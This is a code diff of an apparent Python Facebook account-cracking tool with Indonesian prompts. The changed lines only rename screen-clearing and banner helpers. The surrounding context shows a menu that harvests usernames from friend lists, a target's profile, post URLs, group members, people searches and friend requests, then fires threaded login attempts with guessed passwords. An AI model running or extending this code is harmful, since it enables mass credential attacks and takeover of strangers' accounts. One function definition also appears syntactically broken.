@@ -258,9 +258,9 @@ aink('\033[1;97m|─────────────────────
 def_pilih_utama():
     ngtd = input('\033[90m╰─>[>_<]👉 \033[1;93m ')
     if ngtd == '1':
-       clear()
-       baner()
-       nid()
+       krik_krik_milzu()
+       peak()
+       uwu()
        usr=parser(ses.get(mbasic.format('/me'),cookies=kukis).content,'html.parser').find('a',string='Teman')
        username=temanid(mbasic.format(usr['href']))
        with ThreadPoolExecutor(max_workers=30) as ex:
@@ -282,9 +282,9 @@ def_pilih_utama():
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
     elif ngtd == '2':
-       clear()
-       baner()
-       nid()
+       krik_krik_milzu()
+       peak()
+       uwu()
        asw=input('\033[00mTarget User: \033[93m')
        if asw.isdigit():
           asw='/profile.php?id='+asw
@@ -316,9 +316,9 @@ def_pilih_utama():
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
     elif ngtd == '3':
-         clear()
-         baner()
-         nid()
+         krik_krik_milzu()
+         peak()
+         uwu()
          asw=input('\033[00mPost?Url: \033[93m')
          if 'www.facebook' in asw:
              asw=asw.replace('www.facebook','mbasic.facebook')
@@ -349,9 +349,9 @@ def_pilih_utama():
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Selesai.')
     elif ngtd == '4':
-         clear()
-         baner()
-         nid()
+         krik_krik_milzu()
+         peak()
+         uwu()
          asw=input('\033[00mID Groups: \033[93m')
          username=grupid(mbasic.format('/browse/group/members/?id='+asw))
          with ThreadPoolExecutor(max_workers=30) as ex:
@@ -374,9 +374,9 @@ def_pilih_utama():
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Selesai.')
     elif ngtd == '5':
-         clear()
-         baner()
-         nid()
+         krik_krik_milzu()
+         peak()
+         uwu()
          asw=input('\033[00mQuery: \033[93m')
          username=search(mbasic.format('/search/people/?q='+asw))
          with ThreadPoolExecutor(max_workers=30) as ex:
@@ -399,9 +399,9 @@ def_pilih_utama():
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Selesai.')
     elif ngtd == '6':
-         clear()
-         baner()
-         nid()
+         krik_krik_milzu()
+         peak()
+         uwu()
          username=kmn(mbasic.format('/friends/center/requests/#friends_center_main'))
          with ThreadPoolExecutor(max_workers=30) as ex:
               for user in username:
